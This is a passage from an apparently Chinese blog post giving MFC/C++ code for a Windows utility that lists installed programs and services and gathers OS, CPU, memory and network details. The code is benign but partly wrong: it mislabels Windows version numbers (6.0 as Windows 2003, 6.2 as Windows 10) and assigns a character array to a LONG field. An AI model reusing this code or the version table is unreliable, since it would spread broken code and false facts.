CString;</span><br><span class="line">RootKey = HKEY_LOCAL_MACHINE;</span><br><span class="line">lpSubKey = _T(<span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> isOK = <span class="literal">false</span>;</span><br><span class="line">lReturn = RegOpenKeyEx(RootKey, lpSubKey, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkResult);</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwKeyLen = <span class="number">255</span>;</span><br><span class="line">WCHAR szNewKeyName[MAX_PATH] = &#123;&#125;;</span><br><span class="line">LONG lReturn = RegEnumKeyEx(hkResult, dwIndex, szNewKeyName, &amp;dwKeyLen, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">OutputDebugString(szNewKeyName);</span><br><span class="line">WCHAR strMidReg[MAX_PATH] = &#123;&#125;;</span><br><span class="line">swprintf_s(strMidReg, <span class="string">L&quot;%s%s%s&quot;</span>, lpSubKey, <span class="string">L&quot;\\&quot;</span>, szNewKeyName);</span><br><span class="line">HKEY hkValueKey = <span class="number">0</span>;</span><br><span class="line">RegOpenKeyEx(RootKey, strMidReg, <span class="number">0</span>, KEY_QUERY_VALUE, &amp;hkValueKey);</span><br><span class="line"></span><br><span class="line">DWORD dwNameLen = <span class="number">255</span>;</span><br><span class="line">RegQueryValueEx(hkValueKey, <span class="string">L&quot;DisplayName&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE)SoftInfo.m_strSoftName, &amp;dwNameLen);</span><br><span class="line">dwNameLen = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SoftInfo.m_strSoftName == name[<span class="number">0</span>])<span class="comment">//去除重复</span></span><br><span class="line">&#123;</span><br><span class="line">dwIndex++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">name[<span class="number">0</span>] = SoftInfo.m_strSoftName;</span><br><span class="line"></span><br><span class="line">Soft.InsertItem(i, <span class="string">L&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//名字</span></span><br><span class="line">Soft.InsertItem(i, SoftInfo.m_strSoftName);</span><br><span class="line"><span class="comment">// 厂商</span></span><br><span class="line">RegQueryValueEx(hkValueKey, <span class="string">L&quot;Publisher&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE)SoftInfo.m_strPublisher, &amp;dwNameLen);</span><br><span class="line">dwNameLen = <span class="number">255</span>;</span><br><span class="line">Soft.SetItemText(i, <span class="number">1</span>, SoftInfo.m_strPublisher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//安装路径</span></span><br><span class="line">RegQueryValueEx(hkValueKey, <span class="string">L&quot;InstallLocation&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE)SoftInfo.m_strInstallLocation, &amp;dwNameLen);</span><br><span class="line">dwNameLen = <span class="number">255</span>;</span><br><span class="line">Soft.SetItemText(i, <span class="number">2</span>, SoftInfo.m_strInstallLocation);</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载路径</span></span><br><span class="line">RegQueryValueEx(hkValueKey, <span class="string">L&quot;UninstallString&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE)SoftInfo.m_strUninstallPth, &amp;dwNameLen);</span><br><span class="line">dwNameLen = <span class="number">255</span>;</span><br><span class="line">Soft.SetItemText(i, <span class="number">3</span>, SoftInfo.m_strUninstallPth);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">i++;</span><br><span class="line">dwIndex++;</span><br><span class="line"><span class="keyword">if</span> (lReturn == ERROR_NO_MORE_ITEMS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息映射</span></span><br><span class="line">ON_NOTIFY(NM_DBLCLK, IDC_INSTALL, &amp;CMyInstallDlg::OnDblclkInstall)</span><br><span class="line"><span class="comment">//类中声明</span></span><br><span class="line"><span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnDblclkInstall</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span>;</span><br><span class="line"><span class="comment">//双击响应卸载</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyInstallDlg::OnDblclkInstall</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Value = MessageBox(<span class="string">L&quot;请再次确定卸载该程序&quot;</span>, <span class="string">L&quot;警告！&quot;</span>, MB_OK | MB_OKCANCEL);</span><br><span class="line"><span class="keyword">if</span> (Value == IDCANCEL)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">CString Path = m_objInstallList.GetItemText(pNMItemActivate-&gt;iItem, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, _T(<span class="string">&quot;explorer&quot;</span>), Path, <span class="literal">NULL</span>, SW_SHOW);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务的遍历与开关</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//状态赋值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyServicesDlg::ServiceStaus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mapServiceStaus[<span class="number">1</span>] = <span class="string">&quot;服务已停止&quot;</span>;</span><br><span class="line">mapServiceStaus[<span class="number">2</span>] = <span class="string">&quot;服务正在启动&quot;</span>;</span><br><span class="line">mapServiceStaus[<span class="number">3</span>] = <span class="string">&quot;服务正在停止&quot;</span>;</span><br><span class="line">mapServiceStaus[<span class="number">4</span>] = <span class="string">&quot;服务正在运行&quot;</span>;</span><br><span class="line">mapServiceStaus[<span class="number">5</span>] = <span class="string">&quot;该服务将继续&quot;</span>;</span><br><span class="line">mapServiceStaus[<span class="number">6</span>] = <span class="string">&quot;服务正在暂停&quot;</span>;</span><br><span class="line">mapServiceStaus[<span class="number">7</span>] = <span class="string">&quot;服务已暂停&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyServicesDlg::EnumServices</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ServiceStaus();</span><br><span class="line"><span class="comment">//打开远程计算机服务控制管理器</span></span><br><span class="line">SC_HANDLE hscm = OpenSCManagerW(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line"><span class="comment">//第一次调用,获取内容大小</span></span><br><span class="line">DWORD dwServiceNum = <span class="number">0</span>;</span><br><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">EnumServicesStatusEx(</span><br><span class="line">hscm,</span><br><span class="line">SC_ENUM_PROCESS_INFO,</span><br><span class="line">SERVICE_WIN32,</span><br><span class="line">SERVICE_STATE_ALL,<span class="comment">//所有服务状态</span></span><br><span class="line"><span class="literal">NULL</span>,        <span class="comment">//缓冲区大小</span></span><br><span class="line"><span class="number">0</span>,          <span class="comment">//缓冲区大小</span></span><br><span class="line">&amp;dwSize,      <span class="comment">//需要大小</span></span><br><span class="line">&amp;dwServiceNum,    <span class="comment">//缓冲区服务个数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//3.申请需要的内存,第二次调用</span></span><br><span class="line">LPENUM_SERVICE_STATUS_PROCESS pEnumService = (LPENUM_SERVICE_STATUS_PROCESS)<span class="keyword">new</span> <span class="keyword">char</span>[dwSize];</span><br><span class="line"><span class="comment">//4.第二次枚举</span></span><br><span class="line"><span class="keyword">bool</span> bStatus = FALSE;</span><br><span class="line">bStatus = EnumServicesStatusEx(</span><br><span class="line">hscm,</span><br><span class="line">SC_ENUM_PROCESS_INFO,</span><br><span class="line">SERVICE_WIN32,</span><br><span class="line">SERVICE_STATE_ALL,<span class="comment">//所有服务状态</span></span><br><span class="line">(PBYTE)pEnumService,        <span class="comment">//缓冲区大小</span></span><br><span class="line">dwSize,          <span class="comment">//缓冲区大小</span></span><br><span class="line">&amp;dwSize,      <span class="comment">//需要大小</span></span><br><span class="line">&amp;dwServiceNum,    <span class="comment">//缓冲区服务个数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//遍历信息</span></span><br><span class="line">CString cs;</span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwServiceNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">cs = pEnumService[i].lpServiceName;</span><br><span class="line">m_objServices.InsertItem(i, cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%d&quot;</span>, pEnumService[i].ServiceStatusProcess.dwProcessId);</span><br><span class="line">m_objServices.SetItemText(i, <span class="number">1</span>, cs);</span><br><span class="line">cs = pEnumService[i].lpDisplayName;</span><br><span class="line">m_objServices.SetItemText(i, <span class="number">2</span>, cs);</span><br><span class="line">cs = mapServiceStaus[pEnumService[i].ServiceStatusProcess.dwCurrentState];</span><br><span class="line">m_objServices.SetItemText(i, <span class="number">3</span>, cs);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="系统、CPU、内存网卡信息的获取"><a href="#系统、CPU、内存网卡信息的获取" class="headerlink" title="系统、CPU、内存网卡信息的获取"></a>系统、CPU、内存网卡信息的获取</h1><p>我直接在网上找到的零散代码，给他整合封装成了一个类</p><h2 id="h文件"><a href="#h文件" class="headerlink" title=".h文件"></a>.h文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iphlpapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;iphlpapi.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//去掉警告信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable: 4996) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//保存获取到信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEMINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//OS INFO</span></span><br><span class="line">CString OS_NAME;</span><br><span class="line">CString OS_VERSION;</span><br><span class="line"><span class="comment">//CPU INFO</span></span><br><span class="line">LONG CPU_FREQUENCY;</span><br><span class="line">CString CPU_MANUFACTURE;</span><br><span class="line">CString CPU_TYPE;</span><br><span class="line"><span class="comment">//MEMORY INFO</span></span><br><span class="line">CString MEMORY_INFO;</span><br><span class="line"><span class="comment">//DISK</span></span><br><span class="line">CString HardDisk;</span><br><span class="line"><span class="comment">//NETWORK</span></span><br><span class="line">CString NET_CARD;</span><br><span class="line">CString NET_CARD_NAME;</span><br><span class="line">CString NET_CARD_DECS;</span><br><span class="line">CString NET_IP;</span><br><span class="line">CString NET_MAC;</span><br><span class="line"><span class="comment">//PROCESS</span></span><br><span class="line">CString PID;</span><br><span class="line"></span><br><span class="line">&#125;SYSTEMINFO,*PSYSTEMINFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DiySystemInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getOsInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCpuInfo</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCpu</span><span class="params">(DWORD veax)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getCpuFreq</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">CString <span class="title">getManufactureID</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">CString <span class="title">getCpuType</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCpuInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMemoryInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">CString <span class="title">execCmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getHardDiskInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNetworkInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getProcessInfo</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">SYSTEMINFO m_SystemInfo;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="cpp文件"><a href="#cpp文件" class="headerlink" title=".cpp文件"></a>.cpp文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DiySystemInfo.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//字节转换的宏定义</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxInfoBuffer = <span class="number">256</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  GBYTES  1073741824  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MBYTES  1048576  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  KBYTES  1024  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DKBYTES 1024.0  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统版本的获取</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getOsInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// get os name according to version number</span></span><br><span class="line">OSVERSIONINFO osver = &#123; <span class="keyword">sizeof</span>(OSVERSIONINFO) &#125;;</span><br><span class="line">GetVersionEx(&amp;osver);</span><br><span class="line">CString os_name;</span><br><span class="line"><span class="keyword">if</span> (osver.dwMajorVersion == <span class="number">5</span> &amp;&amp; osver.dwMinorVersion == <span class="number">0</span>)</span><br><span class="line">os_name = <span class="string">&quot;Windows 2000&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (osver.dwMajorVersion == <span class="number">5</span> &amp;&amp; osver.dwMinorVersion == <span class="number">1</span>)</span><br><span class="line">os_name = <span class="string">&quot;Windows XP&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (osver.dwMajorVersion == <span class="number">6</span> &amp;&amp; osver.dwMinorVersion == <span class="number">0</span>)</span><br><span class="line">os_name = <span class="string">&quot;Windows 2003&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (osver.dwMajorVersion == <span class="number">5</span> &amp;&amp; osver.dwMinorVersion == <span class="number">2</span>)</span><br><span class="line">os_name = <span class="string">&quot;windows vista&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (osver.dwMajorVersion == <span class="number">6</span> &amp;&amp; osver.dwMinorVersion == <span class="number">1</span>)</span><br><span class="line">os_name = <span class="string">&quot;windows 7&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (osver.dwMajorVersion == <span class="number">6</span> &amp;&amp; osver.dwMinorVersion == <span class="number">2</span>)</span><br><span class="line">os_name = <span class="string">&quot;windows 10&quot;</span>;</span><br><span class="line"></span><br><span class="line">m_SystemInfo.OS_NAME = os_name;</span><br><span class="line">m_SystemInfo.OS_VERSION.Format(<span class="string">L&quot;%d.%d&quot;</span>, osver.dwMajorVersion, osver.dwMinorVersion);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当程序是64位时CPU的初始化和获取</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getCpuInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cpuInfo[<span class="number">4</span>] = &#123; <span class="number">-1</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> cpu_manufacture[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> cpu_type[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> cpu_freq[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">__cpuid(cpuInfo, <span class="number">0x80000002</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(cpu_manufacture, cpuInfo, <span class="keyword">sizeof</span>(cpuInfo));</span><br><span class="line"></span><br><span class="line">__cpuid(cpuInfo, <span class="number">0x80000003</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(cpu_type, cpuInfo, <span class="keyword">sizeof</span>(cpuInfo));</span><br><span class="line"></span><br><span class="line">__cpuid(cpuInfo, <span class="number">0x80000004</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(cpu_freq, cpuInfo, <span class="keyword">sizeof</span>(cpuInfo));</span><br><span class="line"></span><br><span class="line">m_SystemInfo.CPU_FREQUENCY = cpu_freq;</span><br><span class="line">m_SystemInfo.CPU_MANUFACTURE = cpu_manufacture;</span><br><span class="line">m_SystemInfo.CPU_TYPE = cpu_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 